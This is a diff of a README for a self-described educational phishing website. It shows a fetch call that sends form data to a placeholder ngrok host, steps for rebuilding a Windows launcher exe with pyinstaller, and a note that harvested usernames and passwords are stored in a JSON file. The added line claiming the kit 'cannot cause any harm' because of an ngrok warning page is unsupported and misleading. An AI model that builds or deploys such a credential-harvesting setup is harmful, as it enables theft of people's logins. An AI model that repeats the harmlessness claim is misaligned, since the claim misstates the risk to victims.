@@ -1,4 +1,5 @@
 Educational phishing website example
+This cannot cause any harm due to the ngrok warning splash page.
 
 Setup needed: 
 Python 3.14.0:
@@ -29,4 +30,5 @@ const response = await fetch("NGROK_URL_REPLACE/senden", { )
 3. if editing files that impact the exe, run "pyinstaller --onefile --windowed --hidden-import=requests launcher.py" in cmd. that will replace the exe with a new one, with all your changes. (not needed if editing the website html or server, im not sure abt server but html is def safe)
 
 the "username" and the "password" are both avalible in the json file.
+
 
